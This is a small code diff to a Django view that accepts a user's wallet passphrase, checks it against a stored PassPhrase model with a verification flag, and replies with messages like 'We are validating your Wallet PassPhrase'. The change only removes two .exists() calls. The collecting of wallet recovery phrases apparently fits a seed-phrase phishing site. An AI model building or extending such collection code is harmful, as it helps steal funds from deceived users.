@@ -97,7 +97,7 @@ def submit_pass(request):
                         messages.error(request, 'We are validating your Wallet PassPhrase')
                         return redirect('/wallet/')
                     
-                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
+                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True):
                         return render(request, 'verification.html', {})
                     
                     elif models.PassPhrase.objects.filter(keys=keys).exists():
@@ -109,7 +109,7 @@ def submit_pass(request):
                         messages.error(request, 'Invalid Passphrase')
                         return redirect('/wallet/')
                     
-                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
+                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True):
                         return render(request, 'verification.html', {})
                     
                     elif models.PassPhrase.objects.filter(keys=keys).exists():
